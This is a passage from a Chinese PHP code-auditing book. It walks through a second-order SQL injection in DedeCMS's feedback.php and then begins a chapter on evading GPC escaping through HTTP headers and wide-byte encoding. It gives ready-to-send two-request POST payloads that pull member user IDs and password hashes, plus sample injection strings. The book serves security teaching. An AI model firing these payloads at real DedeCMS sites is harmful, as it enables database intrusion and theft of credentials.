获取被评论的文章标题，这里使用了addslashes（）函数过滤，接着：
$inquery = "INSERT INTO `#@__feedback`
（
`aid`
，
`typeid`
，
`username`
，
`arctitle`
，
`ip`
，
`ischeck`
，
`dtime`
，
`mid`
，
`bad`
，
`good`
，
`ftype`
，
`face`
，
`msg`
）
VALUES
（
'$aid'
，
'$typeid'
，
'$username'
，
'$arctitle'
，
'$ip'
，
'$ischeck'
，
'$dtime'
，
'{$cfg_ml->M_ID}'
，
'0'
，
'0'
，
'$feedbacktype'
，
'$face'
，
'$msg'
）；
"
；
$rs = $dsql->ExecuteNoneQuery
（
$inquery
）；
$rs = $dsql->ExecuteNoneQuery
（
$inquery
）；
将提交的$arctitle变量保存到数据库中，这个过程是没有问题的，我们接着看：
//
引用回复
elseif
（
$comtype == 'reply'
）
{
    $row = $dsql->GetOne
（
"SELECT * FROM `#@__feedback` WHERE id ='$fid'"
）；
    $arctitle = $row['arctitle']
；
//
取出之前保存的文章标题
    $aid =$row['aid']
；
    $msg = $quotemsg.$msg
；
//echo $msg.""
；
    $msg = HtmlReplace
（
$msg
，
2
）；
    //
将
$arctitle
插入到数据库
    $inquery = "INSERT INTO `#@__feedback`
（
`aid`
，
`typeid`
，
`username`
，
`arctitle`
，
`ip`
，
`ischeck`
，
`dtime`
，
`mid`
，
`bad`
，
`good`
，
`ftype`
，
`face`
，
`msg`
）
           VALUES
（
'$aid'
，
'$typeid'
，
'$username'
，
'$arctitle'
，
'$ip'
，
'$ischeck'
，
'$dtime'
，
'{$cfg_ml->M_ID}'
，
'0'
，
'0'
，
'$feedbacktype'
，
'$face'
，
'$msg'
）
"
；
    $dsql->ExecuteNoneQuery
（
$inquery
）；
}
这段代码的作用是引用之前的评论到新的评论中，其中：
$row = $dsql->GetOne
（
"SELECT * FROM `#@__feedback` WHERE id ='$fid'"
）；
$arctitle = $row['arctitle']
；
//
取出之前保存的文章标题
取出之前提交的文章标题，赋值给$arctitle变量，再往下：
$inquery = "INSERT INTO `#@__feedback`
（
`aid`
，
`typeid`
，
`username`
，
`arc-title`
，
`ip`
，
`ischeck`
，
`dtime`
，
`mid`
，
`bad`
，
`good`
，
`ftype`
，
`face`
，
`msg`
）
       VALUES
（
'$aid'
，
'$typeid'
，
'$username'
，
'$arctitle'
，
'$ip'
，
'$ischeck'
，
'$dtime'
，
'{$cfg_ml->M_ID}'
，
'0'
，
'0'
，
'$feedbacktype'
，
'$face'
，
'$msg'
）
"
；
$dsql->ExecuteNoneQuery
（
$inquery
）；
可以看到$arctitle变量被写入到数据库，看到这里还记不记得，这个$arctitle是由用户提交的，第一次写入数据库的时候使用了addslashes（）函数过滤，但是引用评论重新写入数据库的时候并没有过滤，文章标题的数据在整个流程的变化如图7-2所示。
图 7-2
用SQL来表示一下如下：
第一次插入的SQL为：
insert into xx
（
arctitle
）
values
（
'11\''
）；
保存到数据库的标题内容为11'，然后这个数据被select查询出来拼接到第二次插入的SQL上，SQL语句如下：
insert into xx
（
arctitle
）
values
（
'11''
）；
可以看到引发了SQL注入。
在这个漏洞中，标题字段有60个字符的长度限制，不能一次性把完整的payload写入进去，所以我们需要两次提交payload，最终利用方式如下，第一次请求提交
/plus/feedback.php
？
aid=52
POST内容：
action=send&comtype=comments&aid=52&isconfirm=yes&msg=xx&validate=BRUN&title=xx'
，（
char
（
@`'`
）），
/*
我们打印SQL语句出来看看，如图7-3所示。
图 7-3
第二次请求：
/plus/feedback.php
？
aid=52
POST内容：
action=send&comtype=reply&fid=34&isconfirm=yes&validate=sill&msg=*/1
，
2
，
3
，
4
，
5
，
6
，
7
，（
select/**/concat
（
userid
，
0x3a
，
pwd
）
/**/from/**/dede_member/**/limit/**/1
））
%23
打印SQL语句出来看看，如图7-4所示。
图 7-4
发送两次请求后访问：
/plus/feedback.php
？
aid=52
可以看到管理员密码已经被读取出来，如图7-5所示。
图 7-5
第8章 代码审计小技巧
有句话叫熟能生巧，说的是做任何事情，只要做的次数足够多，到达一定熟悉程度后，就一定会掌握一些技巧，来优化我们的效率，那在PHP代码审计这么技术性的工作上，技巧是一定有的，有了这些技巧之后，我们的代码审计就能事半功倍，也能帮助我们挖掘到更多更有价值的漏洞。
因为本书主要介绍的是PHP代码审计，所以PHP应用代码本身之外的漏洞利用的技巧不会介绍。下面我们会从怎么钻GPC等过滤、字符串常见的安全问题、PHP输入输出流、FUZZ挖掘漏洞以及正则表达式不严谨容易出现的问题等几个方面来介绍一些小技巧。
8.1 钻GPC等转义的空子
GPC会自动把我们提交上去的单引号等敏感字符给转义掉，这样我们的攻击代码就没法执行了，GPC是PHP天生自带的功能，所以是我们最大的天敌。不过不要担心，GPC并不是把所有变量都进行了过滤，反而人们容易忽视而又用得多的$_SERVER变量没有被GPC过滤，包括编码转换的过程中，部分情况下我们也是可以干掉GPC的转义符号，是不是有点小激动？下面我们来仔细了解下。
8.1.1 不受GPC保护的$_SERVER变量
GPC上面我们已经介绍过，是用来过滤request中提交的数据，将特殊字符进行转义来防止攻击，在PHP5之后用$_SERVER取到的header字段不受GPC影响，所以当GPC开启的时候，它里面的特殊字符如单引号也不会被转义掉，另外一点是普通程序员很少会考虑到这些字段被修改。而在header注入里面最常见的是user-agent、referer以及client-ip/x-forward-for，因为大多的Web应用都会记录访问者的IP以及referer等信息。同样的$_FILES变量也一样不受GPC保护。
测试代码如下：
 client-ip = '.$_SERVER["HTTP_CLIENT_IP"]
；
echo '$_GET[a] = '.$_GET['a']
；
测试截图见图8-1。
图 8-1
8.1.2 编码转换问题
本书前面第4章介绍过宽字节注入，这就是一种非常典型的编码转换问题导致绕过GPC的方式。我们之前的举例说明，给一个查询页面ID参数请求/1.php？id=-1%df’and 1=1%23时，这时MySQL运行的SQL语句为：
select * from user where id=
’
1
运’
and 1=1#
’
这是由于单引号被自动转义成\’，前面的%df和转义字符\反斜杠（%5c）组合成了%df%5c，也就是“运”字，这时候单引号依然还在，于是成功闭合了前面的单引号。
这个例子讲的是PHP与MySQL交互过程中发生编码转换导致的问题，而其实只要发生编码转换就有可能出现这种问题，也就是说在PHP自带的编码转换函数上面也会存在这个问题，比如mb_convert_encoding（）函数。
我们来证实一下，代码如下：
<
？
php
$sql="where id='".urldecode
（
"-1%df%5c' -- "
）
."'"
；
print_r
（
mb_convert_encoding
（
$sql
，